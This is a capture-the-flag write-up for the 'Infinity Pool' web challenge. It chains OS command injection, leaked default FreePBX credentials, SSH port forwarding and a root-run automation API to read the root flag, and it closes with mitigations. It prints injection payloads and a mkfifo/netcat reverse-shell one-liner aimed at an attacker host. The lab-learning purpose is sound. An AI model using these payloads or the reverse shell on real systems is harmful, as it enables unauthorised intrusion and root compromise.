# Infinity Pool

**Difficulty:** Medium
**Category:** Web Security, OS Command Injection, Internal Services

---

# Summary

Infinity Pool is a web-based challenge that focuses on chaining multiple vulnerabilities across several internal services. Initial access was obtained through an **OS Command Injection** vulnerability in the web application, allowing remote code execution as the **web** user. After enumerating localhost-only services, an internal Watchtower API exposed sensitive configuration containing default FreePBX credentials. These credentials were used to access the internal FreePBX User Control Panel, where an **Automation API Key** was recovered. Finally, the key was used to authenticate to a privileged automation service running as **root**, where an authenticated command injection vulnerability resulted in root command execution and retrieval of the final flag.

---

# Attack Chain

1. Discover the hidden `/status` endpoint.
2. Identify OS Command Injection.
3. Obtain a reverse shell.
4. Enumerate localhost-only services.
5. Discover the internal Watchtower API.
6. Recover FreePBX UCP credentials.
7. Access the internal UCP portal.
8. Recover the Automation API Key.
9. Authenticate to the Automation API.
10. Abuse the vulnerable export functionality.
11. Execute commands as **root**.
12. Retrieve the root flag.

---

# Enumeration

Directory enumeration identified an interesting endpoint.

```bash
gobuster dir \
-u http://<TARGET_IP> \
-w /usr/share/wordlists/dirb/common.txt
```

Interesting endpoint:

```text
/status
```

Testing the endpoint confirmed **OS Command Injection**.

```text
127.0.0.1;id
```

After confirming command execution, a reverse shell was obtained.

```text
127.0.0.1;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f
```

Start a listener:

```bash
nc -lvnp 4444
```

This provided an interactive shell as the **web** user.

The user flag was found at:

```text
/home/web/user.txt
```

---

# Internal Enumeration

The room hint stated:

> **"No visible edge. You trace the network to the horizon and find three systems nobody told you about on the other side."**

After gaining shell access, localhost services were enumerated.

```bash
ss -ltnp
```

Interesting services:

| Port | Service        |
| ---- | -------------- |
| 3000 | Watchtower     |
| 8080 | FreePBX UCP    |
| 9000 | Automation API |

These three internal services matched the room hint.

---

# Watchtower

The Watchtower API exposed internal configuration.

```bash
curl http://127.0.0.1:3000/api/config
```

Response:

```json
{
  "automation_endpoint":"http://127.0.0.1:9000",
  "note":"internal network only -- do not expose",
  "ops_note":"UCP still on default template creds (FreePBXUCPTemplateCreator) -- ROTATE.",
  "telephony_pass":"***************",
  "telephony_portal":"http://127.0.0.1:8080/ucp",
  "telephony_user":"FreePBXUCPTemplateCreator"
}
```

The configuration revealed:

* Internal Automation endpoint
* Internal FreePBX UCP portal
* Default UCP credentials

---

# FreePBX UCP

Since the UCP interface was only accessible locally, SSH local port forwarding was used.

Generate an SSH key:

```bash
ssh-keygen
```

Copy the public key to the target user's `authorized_keys` file and connect using SSH.

Forward the internal UCP service:

```bash
ssh -L 8080:127.0.0.1:8080 web@<TARGET_IP>
```

The UCP interface was then accessed locally:

```text
http://127.0.0.1:8080/ucp
```

After logging in with the recovered credentials, the **Voicemail** section contained the Automation API Key.

Example:

```text
Automation Key

cc_auto_xxxxxxxxxxxxxxxxx
```

---

# Automation Service

The Automation API documentation was available through the health endpoint.

```bash
curl http://127.0.0.1:9000/health
```

Response:

```json
{
  "endpoints": {
    "GET /health": "service status",
    "POST /jobs/export": {
      "auth": "Authorization: Bearer <automation key>",
      "body": {
        "report": "<report name>"
      },
      "desc": "archive the latest data export"
    }
  },
  "runs_as": "root",
  "service": "automation",
  "status": "ok"
}
```

Authentication was verified using the recovered bearer token.

```bash
curl -i \
-X POST http://127.0.0.1:9000/jobs/export \
-H "Authorization: Bearer <TOKEN>"
```

Response:

```json
{
  "error":"field 'report' is required"
}
```

This confirmed that authentication was successful.

Testing the report parameter with **test;id;test** confirmed a command injection vulnerability, as the backend shell executed the injected id command directly. Since the automation service ran with root privileges, supplying **test;cat /root/root.txt;test** in the report field allowed the command to execute as root, instantly retrieving the flag and completing the room.

---

# Mitigation

* Validate and sanitize all user-controlled input before command execution.
* Avoid constructing shell commands using unsanitized parameters.
* Remove default credentials before deployment.
* Do not expose sensitive configuration through internal APIs.
* Protect internal services with proper authentication and authorization.
* Regularly audit trust relationships between internal services.
